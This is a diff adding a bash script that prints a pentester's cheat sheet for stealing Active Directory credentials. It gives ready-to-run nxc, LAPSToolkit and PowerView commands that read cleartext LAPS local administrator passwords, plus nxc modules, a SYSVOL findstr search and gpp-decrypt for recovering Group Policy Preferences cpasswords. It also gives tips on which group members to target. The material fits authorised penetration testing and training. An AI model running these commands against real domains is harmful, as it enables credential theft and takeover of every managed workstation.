@@ -1,0 +1,52 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── LAPS & GPP PASSWORDS ─────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── LAPS — Local Admin Password Solution ─────────────${NC}"
+printf "\n"
+echo -e "  Note: nxc (primary):"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M laps${NC}"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --module laps${NC}"
+printf "\n"
+echo -e "  Note: LAPSToolkit (PowerShell):"
+echo -e "  ${GREEN}Import-Module .\\LAPSToolkit.ps1${NC}"
+echo -e "  ${GREEN}Get-LAPSComputers${NC}                          # shows cleartext admin pass"
+echo -e "  ${GREEN}Find-LAPSDelegatedGroups${NC}                   # groups with LAPS read rights"
+echo -e "  ${GREEN}Find-AdmPwdExtendedRights${NC}                  # who has extended rights"
+printf "\n"
+echo -e "  Note: PowerView:"
+echo -e "  ${GREEN}Get-DomainComputer -Filter '(ms-Mcs-AdmPwd=*)' -Properties ms-Mcs-AdmPwd,name${NC}"
+echo -e "  ${GREEN}Get-DomainComputer -Identity TARGET -Properties ms-Mcs-AdmPwd${NC}"
+printf "\n"
+echo -e "  ${BLUE}Key insight: enumerate LAPS delegated group -> find all members -> any member${NC}"
+echo -e "  ${BLUE}can read cleartext local admin password for EVERY managed workstation.${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── GPP Passwords — Group Policy Preferences ─────────${NC}"
+printf "\n"
+echo -e "  Note: nxc (primary):"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password${NC}   # GPP cpassword"
+echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_autologin${NC}  # autologin creds"
+printf "\n"
+echo -e "  Note: Manual search in SYSVOL:"
+echo -e "  ${GREEN}findstr /S cpassword \\\\<DOMAIN>\\SYSVOL\\*.xml${NC}"
+printf "\n"
+echo -e "  Note: Decrypt cpassword (AES key published by Microsoft):"
+echo -e "  ${GREEN}gpp-decrypt '<cpassword_value>'${NC}"
+printf "\n"
+echo -e "  Note: Where to look (manual):"
+echo -e "  ${GREEN}\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\**\\Groups.xml${NC}"
+echo -e "  ${GREEN}\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\**\\Services.xml${NC}"
+echo -e "  ${GREEN}\\\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\**\\ScheduledTasks.xml${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
